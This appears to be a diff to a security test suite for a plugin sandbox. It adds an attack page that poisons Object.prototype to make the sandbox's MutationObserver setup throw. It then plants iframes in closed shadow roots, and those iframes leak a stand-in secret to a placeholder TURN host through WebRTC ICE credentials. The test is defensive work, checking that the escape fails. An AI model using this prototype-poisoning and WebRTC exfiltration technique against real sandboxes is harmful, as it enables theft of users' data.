@@ -374,6 +374,86 @@ const OBSERVER_POISON_ATTACK_HTML = `<!doctype html>
   </body>
 </html>`;
 
+/**
+ * Round 8 poisoned `observe` itself. This one leaves `observe` alone and
+ * poisons what it *reads*.
+ *
+ * `watch()` calls `A(startWatching, observer, [root, WATCH])` with `WATCH` — a
+ * plain object literal built at init, so its prototype is `Object.prototype`.
+ * `observe` converts it to a `MutationObserverInit` dictionary, and WebIDL
+ * dictionary conversion is a `Get` per member: every member `WATCH` does not
+ * own is read off `Object.prototype`, which the plugin owns. `attributeFilter`
+ * is a `sequence<DOMString>`, so a non-iterable value there makes the
+ * conversion throw a `TypeError` before `observe` does anything.
+ *
+ * Capturing the method did not help: it is the *argument* that is late-bound.
+ * `watch()` then throws before it reaches `sweep(root)`, so the root is both
+ * unwatched and unswept — and `follow()` inside the sweep throws for the same
+ * reason on every later attempt, so the belt-and-braces open-root scan cannot
+ * recover it either.
+ *
+ * Both orderings: attach the root to an already-connected host so no document
+ * mutation ever names it again, and attach it to a detached host so the
+ * document-level sweep gets its turn and dies in `follow()`.
+ *
+ * This test FAILS as of fb954accd — both children report
+ * `RTCPeerConnection` back and reach an attacker-chosen TURN host with the
+ * payload in the ICE username. The fix is for the shell to build every object
+ * it hands to a web API with `Object.create(null)`, so no dictionary member it
+ * leaves unset is read off a prototype the plugin owns: `WATCH` here, and the
+ * `attachShadow` init object next to it (`Object.prototype.clonable = true`
+ * there yields a shadow root from `cloneNode` with no `attachShadow` call
+ * anywhere). Capturing the callee is not enough when the argument is late-bound.
+ */
+const OBSERVER_INIT_POISON_ATTACK_HTML = `<!doctype html>
+<html>
+  <body>
+    <script>
+      var CHILD = "&lt;script&gt;var ice='no';try{var pc=new RTCPeerConnection(" +
+        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
+        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
+        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
+        "{exfil:1,type:'child',tag:'TAG',ice:ice},'*');&lt;/script&gt;";
+
+      function plantInto(root, tag) {
+        var frame = document.createElement("iframe");
+        frame.setAttribute("srcdoc", CHILD.replace("TAG", tag).replace(/&lt;/g, "<").replace(/&gt;/g, ">"));
+        root.appendChild(frame);
+      }
+
+      window.addEventListener("message", function (event) {
+        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;
+
+        // Not a member of the shell's WATCH object, so it is read off
+        // Object.prototype. A non-iterable makes sequence<DOMString> throw.
+        try { Object.prototype.attributeFilter = 1; } catch (error) {}
+
+        // Host already connected: after attachShadow throws, nothing the plugin
+        // does inside the root is ever a document mutation.
+        try {
+          var connected = document.createElement("div");
+          document.body.appendChild(connected);
+          try { connected.attachShadow({ mode: "closed" }); } catch (error) {}
+          plantInto(connected.shadowRoot, "init-poison-connected");
+        } catch (error) {}
+
+        // Host detached: the document sweep does see it, and dies in follow().
+        try {
+          var detached = document.createElement("div");
+          try { detached.attachShadow({ mode: "closed" }); } catch (error) {}
+          plantInto(detached.shadowRoot, "init-poison-detached");
+          document.body.appendChild(detached);
+        } catch (error) {}
+
+        setTimeout(function () {
+          window.parent.postMessage({ exfil: 1, type: "swept" }, "*");
+        }, 600);
+      });
+      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
+    </script>
+  </body>
+</html>`;
+
 interface Outcomes {
   windowOpen: string;
   fetch: string;
@@ -676,6 +756,40 @@ describe("a hostile plugin", () => {
     await waitFor(() => (swept ? true : null), "the observer-poison attack to finish");
 
     expect(childReports).toEqual([]);
+  });
+
+  it("cannot get a child realm by poisoning what the observer reads", async () => {
+    const childReports: string[] = [];
+    let swept = false;
+    const onMessage = (event: MessageEvent) => {
+      const data = event.data as { exfil?: number; type?: string; tag?: string; ice?: string };
+      if (data?.exfil !== 1) {
+        return;
+      }
+      if (data.type === "child") {
+        childReports.push(`${data.tag}=${data.ice}`);
+      }
+      if (data.type === "swept") {
+        swept = true;
+      }
+      if (data.type === "ready") {
+        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
+      }
+    };
+    window.addEventListener("message", onMessage);
+
+    const iframe = createPluginIframe(OBSERVER_INIT_POISON_ATTACK_HTML);
+    document.body.appendChild(iframe);
+    cleanups.push(() => {
+      window.removeEventListener("message", onMessage);
+      iframe.remove();
+    });
+
+    await waitFor(() => (swept ? true : null), "the observer-init poison attack to finish");
+
+    // Joined so the failure names the tags and says whether the child's WebRTC
+    // actually started gathering, rather than printing `[ …(2) ]`.
+    expect(childReports.join(" ")).toBe("");
   });
 
   it("cannot leak a hostname through a resource hint in its markup", async () => {
